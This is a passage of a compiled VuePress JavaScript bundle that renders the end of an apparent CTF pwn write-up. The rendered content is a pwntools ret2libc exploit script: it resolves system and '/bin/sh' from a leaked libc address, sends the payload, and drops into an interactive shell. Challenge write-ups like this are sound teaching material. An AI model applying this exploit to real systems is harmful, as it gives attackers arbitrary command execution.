punctuation"}},[s._v(",")]),s._v("write_addr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nlibc_base"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("write_addr"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("libc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("dump"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nsystem"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("libc_base"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("libc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("dump"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'system'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nsh"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("libc_base"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("libc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("dump"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'str_bin_sh'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#第二次执行 /bin/sh")]),s._v("\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recvuntil"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"name?"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\npayload"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("system"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recvuntil"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"say?"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br")])])])}),[],!1,null,null,null);t.default=e.exports}}]);